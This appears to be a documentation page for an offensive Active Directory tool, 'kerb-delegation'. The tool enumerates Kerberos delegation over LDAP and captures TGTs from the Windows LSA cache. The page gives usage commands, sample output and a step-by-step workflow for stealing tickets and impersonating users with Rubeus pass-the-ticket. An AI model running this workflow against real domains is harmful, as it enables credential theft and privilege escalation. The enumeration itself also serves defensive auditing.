+++
title = "kerb-delegation"
chapter = false
weight = 106
hidden = false
+++

## Summary

Enumerate Kerberos delegation relationships in Active Directory via LDAP. Identifies unconstrained delegation, constrained delegation (with protocol transition detection), and resource-based constrained delegation (RBCD) configurations that could be abused for lateral movement or privilege escalation.

The **monitor** action (Windows/SYSTEM only) polls the local LSA Kerberos ticket cache on all logon sessions to capture incoming TGTs in real time — the key exploitation step for unconstrained delegation hosts.

LDAP actions are cross-platform (Windows, Linux, macOS). `monitor` is Windows-only and requires SYSTEM or equivalent privileges.

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | Yes | | `all`, `unconstrained`, `constrained`, `rbcd`, or `monitor` |
| server | No (monitor) | | Domain controller IP or hostname (not needed for monitor) |
| username | No | | LDAP bind username (user@domain format) |
| password | No | | LDAP bind password |
| port | No | 389 | LDAP port |
| use_tls | No | false | Use LDAPS (port 636) |
| duration | No | 300 | Monitor duration in seconds (monitor action, max 3600) |
| interval | No | 10 | Poll interval in seconds (monitor action, min 5) |

## Actions

| Action | Description |
|--------|-------------|
| `unconstrained` | Find accounts with TrustedForDelegation (UAC 0x80000). Excludes domain controllers (primaryGroupID=516). |
| `constrained` | Find accounts with msDS-AllowedToDelegateTo set. Reports protocol transition (S4U2Self) capability. |
| `rbcd` | Find objects with msDS-AllowedToActOnBehalfOfOtherIdentity. Parses the security descriptor to show allowed principals. |
| `all` | Run all three checks plus sensitive account enumeration (NOT_DELEGATED flag). |
| `monitor` | **(Windows/SYSTEM only)** Poll all logon sessions for new TGTs via `LsaEnumerateLogonSessions` + `KerbQueryTicketCacheExMessage`. Export captured TGTs as base64 kirbi blobs compatible with Rubeus/Mimikatz. |

## Usage

```
# Enumerate all delegation in a domain
kerb-delegation -action all -server 192.168.1.10 -username admin@corp.local -password Pass123

# Check only unconstrained delegation
kerb-delegation -action unconstrained -server dc01.corp.local -username admin@corp.local -password Pass123

# Monitor for incoming TGTs (run on unconstrained delegation host as SYSTEM)
kerb-delegation -action monitor -duration 300 -interval 10

# Short watch with fast polling
kerb-delegation -action monitor -duration 60 -interval 5
```

## Monitor Output Format

Returns a JSON object with captured TGT metadata and kirbi bytes:
```json
{
  "duration": 300,
  "interval": 10,
  "total": 2,
  "message": "Monitored for 300s (interval: 10s). Captured 2 new TGT(s).",
  "captured": [
    {
      "luid": "0x00000000000003E7",
      "client": "joffrey@SEVENKINGDOMS.LOCAL",
      "server": "krbtgt/SEVENKINGDOMS.LOCAL@SEVENKINGDOMS.LOCAL",
      "start_time": "2026-05-05 10:00:00",
      "end_time": "2026-05-05 20:00:00",
      "kirbi_b64": "YIIGDDCCBgiGCSqGSIb3DQEFB...",
      "captured_at": "2026-05-05T10:01:23Z"
    }
  ]
}
```

Use the kirbi with Rubeus: `Rubeus.exe ptt /ticket:<kirbi_b64>`

## LDAP Enumeration Output Format

Returns a JSON array rendered as a sortable table via browser script:
```json
[
  {
    "account": "FILESERVER$",
    "dns": "fileserver.corp.local",
    "delegation_type": "Unconstrained",
    "spns": ["cifs/fileserver.corp.local", "HOST/fileserver.corp.local"],
    "risk": "TGT cached for any authenticating user"
  },
  {
    "account": "SVC-SQL$",
    "dns": "svc-sql.corp.local",
    "delegation_type": "Constrained",
    "mode": "Protocol Transition (S4U2Self)",
    "targets": ["MSSQLSvc/dbserver.corp.local", "MSSQLSvc/dbserver.corp.local:1433"],
    "s4u2self": true,
    "risk": "S4U2Self enabled — no user interaction needed"
  }
]
```

## Unconstrained Delegation Exploitation Workflow

1. **Enumerate**: `kerb-delegation -action unconstrained -server <DC>` — identify hosts with TrustedForDelegation
2. **Pivot**: Obtain code execution on the unconstrained delegation host (e.g., via lateral movement)
3. **Monitor**: `kerb-delegation -action monitor -duration 300` — wait for a privileged user (e.g., DA) to authenticate
4. **Use**: Take the kirbi blob → `klist -action import -ticket <kirbi_b64>` or Rubeus `ptt`

{{% notice info %}}Windows Only — monitor action{{% /notice %}}
The `monitor` action requires Windows and SYSTEM (or equivalent) privileges. All other actions are cross-platform.

## Delegation Attack Patterns

| Type | Risk | Attack |
|------|------|--------|
| Unconstrained | **Critical** | Any user authenticating to this server has their TGT cached. Capture with `monitor` and impersonate. |
| Constrained | **High** | Account can impersonate users to listed services. With protocol transition, no user interaction needed. |
| RBCD | **High** | Control an account in the RBCD ACL → impersonate any user to that target's services. |

## MITRE ATT&CK Mapping

- **T1550.003** — Use Alternate Authentication Material: Pass the Ticket
- **T1558** — Steal or Forge Kerberos Tickets (monitor action)
